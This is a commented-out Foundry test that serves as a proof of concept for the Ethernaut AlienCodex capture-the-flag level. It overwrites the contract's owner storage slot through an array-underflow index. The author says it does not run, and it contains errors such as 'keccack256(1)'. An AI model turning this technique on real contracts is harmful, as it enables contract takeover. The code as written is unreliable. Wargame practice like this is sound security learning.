// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.0;

// import "forge-std/Test.sol";

// // import "../src/levels/19-AlienCodex/AlienCodex.sol";

// // [NOTE] Simply poc, cannot work on foundry since version issue
// contract ContractTest is Test {
//     // cast storage 0xb385aCa71ace780e814144b783CB5c121b460668 1 --rpc-url https://rpc.ankr.com/eth_sepolia
//     AlienCodex level19 =
//         AlienCodex(payable(0xb385aCa71ace780e814144b783CB5c121b460668));

//     function setUp() public {
//         Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
//         vm.createSelectFork(vm.rpcUrl("sepolia"));

//         vm.label(address(this), "Attacker");
//         vm.label(
//             address(0xb385aCa71ace780e814144b783CB5c121b460668),
//             "Ethernaut19"
//         );
//     }

//     function testEthernaut19() public {
//         level19.makeContact();
//         unchecked {
//             uint256 index_zero = (2 ** 256 - 1 - uint256(keccack256(1)) + 1);
//             console.log(index_zero);
//             level19.revise(index_zero, address(this));
//         }
//         bytes32 myKey = vm.load(address(level19), bytes32(uint256(0)));
//     }

//     receive() external payable {}
// }
